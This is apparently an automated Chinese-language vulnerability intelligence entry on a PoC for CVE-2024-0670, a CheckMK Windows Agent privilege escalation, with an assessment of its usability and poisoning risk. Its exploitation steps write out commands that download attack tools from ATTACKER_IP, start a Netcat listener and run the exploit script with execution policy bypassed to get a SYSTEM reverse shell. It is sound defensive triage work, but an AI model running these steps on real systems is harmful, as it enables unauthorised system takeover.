## CVE-2024-0670 - CheckMK Windows Agent Local Privilege Escalation (LPE)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** Local Privilege Escalation (LPE)

**影响应用:** CheckMK Windows Agent

**危害等级:** High

**CVSS评分:** N/A

**影响版本:** Specific affected versions are not detailed in the provided input.

**利用条件:** Requires local access as a low-privileged user on a Windows system with CheckMK Agent installed. PowerShell must be enabled, and the system must allow outbound connections (HTTP) to download exploit tools.

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

POC有效性分析：
CVE-2024-0670 是 CheckMK Windows Agent 中发现的一个本地权限提升 (LPE) 漏洞。该漏洞的根源在于，在触发 MSI 修复机制时，CheckMK Agent 会以 `NT AUTHORITY\SYSTEM` 的高权限执行 `C:\Windows\Temp\` 目录下的可写文件。低权限用户可以利用这一机制，在上述目录中放置具有可预测名称的恶意文件，从而以 SYSTEM 权限执行任意代码。

提供的 PoC 包含三个关键组件：`exploit.ps1` (主要的 PowerShell 攻击脚本)、`RunasCs.exe` (一个支持明文密码的 `runas` 替代工具) 和 `nc.exe` (Netcat 可执行文件，用于建立反向 Shell)。该 PoC 的利用逻辑清晰：攻击者首先在其控制的机器上设置一个 HTTP 服务器，托管这些恶意文件。然后，在目标 Windows 系统上，一个低权限用户通过 PowerShell 下载这些文件至 `C:\Windows\Temp\` 目录。随后，利用 `RunasCs.exe` 以低权限用户的身份执行 `exploit.ps1` 脚本，该脚本将触发 CheckMK Agent 的 MSI 修复过程，并在此过程中利用漏洞，最终以 `NT AUTHORITY\SYSTEM` 权限执行 `nc.exe`，回连至攻击者预设的 Netcat 监听器，从而获得 SYSTEM 权限的反向 Shell。整个利用链条完整且直接，PoC 代码和文档提供了详细的步骤和要求，表明其具有高度的可用性和有效性。

利用步骤：
1.  **攻击者准备阶段:**
    *   在攻击者机器上启动一个简单的 HTTP 服务器（例如，使用 Python 的 `http.server` 模块），托管 `RunasCs.exe`、`nc.exe` 和 `exploit.ps1` 文件。确保这些文件可通过 HTTP 访问。
    *   在攻击者机器上启动一个 Netcat 监听器，用于接收反向 Shell 连接。例如，运行命令 `nc -lvnp 1111`（选择任意可用端口，如1111）。
2.  **受害者机器操作 (低权限用户):**
    *   确保目标 Windows 机器上已安装 CheckMK Windows Agent，并且攻击者已获得该机器的低权限用户账户。
    *   通过 PowerShell 从攻击者 HTTP 服务器下载上述三个工具文件到受害者机器的 `C:\Windows\Temp\` 目录。示例如下：
        ```powershell
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"
        ```
    *   以低权限用户身份执行 `RunasCs.exe`，并传入该低权限用户的用户名和密码，以及要执行的 PowerShell 命令。该命令将调用下载到 `C:\Windows\Temp\` 的 `exploit.ps1` 脚本：
        ```powershell
.\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"
        ```
3.  **结果:**
    *   如果漏洞利用成功，攻击者机器上的 Netcat 监听器将收到一个来自受害者机器的 `NT AUTHORITY\SYSTEM` 权限的反向 Shell 连接。

投毒风险分析：
本 PoC 代码的组成清晰，主要包括 `RunasCs.exe` (及其C#源代码 `RunasCs.cs`)、`nc.exe` 和 `exploit.ps1` 脚本。在评估其投毒风险时，我们着重分析代码的意图、行为及其是否包含未声明的恶意功能。

`RunasCs.cs` 的部分代码显示其旨在实现一个 `runas` 的替代工具，支持在命令行中直接传入明文密码，这在自动化脚本中可能用于简化操作。虽然仅提供了部分源代码，但其描述的功能符合 PoC 利用的需求，并未显示出超出此范围的额外恶意意图。

`nc.exe` 是一个广为人知的网络工具，常用于渗透测试场景中建立反向或正向 Shell，是实现远程控制的关键组件。它作为 PoC 的一部分，用于获取 SYSTEM 权限的 Shell，这符合漏洞利用的预期目的，而非额外的“投毒”行为。假定此处的 `nc.exe` 是标准版本，未被篡改。

`exploit.ps1` 是整个利用链的核心。根据描述，它负责“植入多个Payload文件名并触发MSI修复以实现SYSTEM执行”。其最终目标是启动一个 SYSTEM 权限的反向 Shell。PoC 的 `README.md` 文件详细说明了如何设置攻击环境和执行脚本，所有外部文件（`RunasCs.exe`、`nc.exe`、`exploit.ps1`）都明确指示从攻击者控制的 HTTP 服务器下载。这种行为是 PoC 正常运作的一部分，不应被误判为恶意投毒。

在代码混淆方面，提供的 PoC 代码示例（特别是 `RunasCs.cs` 的部分）看起来结构清晰，没有明显的代码混淆迹象。外部网络请求仅限于从攻击者控制的 IP 地址下载工具，以及反向 Shell 连接到攻击者监听器，这些都属于 PoC 的正常操作范围，未发现未经授权或隐藏的 C2 通信、数据窃取或其他恶意回连。

此外，PoC 的 `README.md` 中明确包含了法律免责声明，指出“此项目仅用于教育和授权渗透测试。请勿用于非法目的。作者不对滥用负责。”这进一步强调了其作为合法安全研究工具的性质。

综合分析，该 PoC 代码在功能上与 CVE-2024-0670 的本地权限提升目标高度一致，代码结构和利用流程透明，没有发现代码混淆、隐蔽的恶意外部连接或与漏洞利用目的无关的额外恶意功能。因此，评估此 PoC 代码被“投毒”的风险等级为低，即 `10%`。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
